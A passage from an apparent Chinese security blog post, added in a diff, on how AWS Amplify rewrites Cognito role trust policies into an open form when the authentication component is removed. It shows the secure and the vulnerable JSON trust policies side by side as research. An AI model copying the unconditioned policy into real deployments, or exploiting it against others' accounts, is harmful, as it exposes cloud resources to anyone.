+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="s2">&#34;sts:AssumeRoleWithWebIdentity&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Condition&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;StringEquals&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;cognito-identity.amazonaws.com:aud&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;Cognito Identity Pool Id&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;ForAnyValue:StringLike&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;cognito-identity.amazonaws.com:amr&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;authenticated || unauthenticated&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同样，这种角色信任策略也是安全的，它强制规定哪个身份池可以用来模拟当前角色。但是，如果用户选择从Amplify应用程序中删除身份验证组件，Amplify就会删除后台的Cognito资源，并修改授权和非授权角色的角色信任策略。它将把角色信任策略修改如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;Federated&#34;</span><span class="p">:</span> <span class="s2">&#34;cognito-identity.amazonaws.com&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="s2">&#34;sts:AssumeRoleWithWebIdentity&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这就是之前章节中提到的漏洞配置。任意用户只要从Amplify项目中移除身份验证组件，角色信任策略就会被修改为向所有人开放。云安全研究面临的一个挑战是，云提供商提供的服务通常是不透明的，它们接受输入并返回输出，用户通常无法察觉过程中的变化。</p>
+<h4 id="252-方式二">2.5.2. 方式二</h4>
+<p>在研究过程中注意到，虽然大多数存在风险的角色都采用了上述信任策略，但仍有一些角色被配置了不同的信任策略：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Sid&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;Federated&#34;</span><span class="p">:</span> <span class="s2">&#34;cognito-identity.amazonaws.com&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="s2">&#34;sts:AssumeRoleWithWebIdentity&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Condition&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;ForAnyValue:StringLike&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;cognito-identity.amazonaws.com:amr&#34;</span><span class="p">:</span> <span class="s2">&#34;authenticated&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此处cognito-identity.amazonaws.com:amr 的值可以是authenticated或者unauthenticated，并采用相同的命名惯例，以 authRole 或 unauthRole 结尾。但目前暂时无法确定是什么原因导致角色配置错误。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-09-30</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/2024/09/%E5%88%A9%E7%94%A8%E4%BA%91%E6%8F%90%E4%BE%9B%E5%95%86%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/" data-title="利用云提供商漏洞获取初始访问权限"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://localhost:1313/2024/09/%E5%88%A9%E7%94%A8%E4%BA%91%E6%8F%90%E4%BE%9B%E5%95%86%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/" data-title="利用云提供商漏洞获取初始访问权限"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="http://localhost:1313/2024/09/%E5%88%A9%E7%94%A8%E4%BA%91%E6%8F%90%E4%BE%9B%E5%95%86%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/" data-title="利用云提供商漏洞获取初始访问权限"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/">云原生安全</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2024/09/%E9%80%9A%E8%BF%87%E5%BD%B1%E5%AD%90%E8%B5%84%E6%BA%90%E6%94%BB%E5%87%BBaws%E5%B8%90%E6%88%B7/" class="prev" rel="prev" title="通过影子资源攻击AWS帐户"><i class="fas fa-angle-left fa-fw"></i>通过影子资源攻击AWS帐户</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
